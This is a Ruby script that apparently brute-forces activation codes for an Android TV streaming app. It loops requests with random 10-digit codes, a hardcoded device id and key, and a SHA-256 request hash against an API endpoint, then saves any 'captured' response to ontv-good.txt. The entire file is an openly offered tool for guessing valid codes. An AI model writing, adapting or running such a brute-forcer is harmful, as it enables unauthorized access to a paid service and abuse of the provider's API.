require 'httparty'
require 'digest'
system("clear")
def generate_hash(parameters)
  concatenated_params = parameters.values.join('')
  hash = Digest::SHA256.hexdigest(concatenated_params)
  hash
end

def generate_random_10_digit_number
  rand(10**9...10**10).to_s
end

parameters = {
  'app' => 'android_pk_mtv',
  'ac' => generate_random_10_digit_number,
  'mc' => '47b6fb44e912a5d9',
  'model' => 'android_pk_mtv',
  'version' => '2.0.2',
  'api' => '21',
  'key' => 'TWbqH8FTmdbYC-1677888170'
}

request_count = 0

loop do
  request_count += 1

  hash_value = generate_hash(parameters)
  parameters['hash'] = hash_value

  url = 'http://www.user-api-validator.xyz/api/v2/'
  response = HTTParty.get(url, query: parameters)

  if response.body.include?("none")
    puts "\e[31m[-] #{request_count} - Did not capture anything, sorry!\e[0m"
    print "\e[31mResponse body:\e[0m"
    puts response.body
  else
    puts "\e[32m[+] #{request_count} - Good!"
    puts "\e[32mResponse body:"
    sleep(1)
    File.open("ontv-good.txt", "w") do |file|
      file.write(response.body)
      puts "\e[95mSaved in ontv-good.txt\e[0m"
      sleep(1)
    end
    break
  end
end
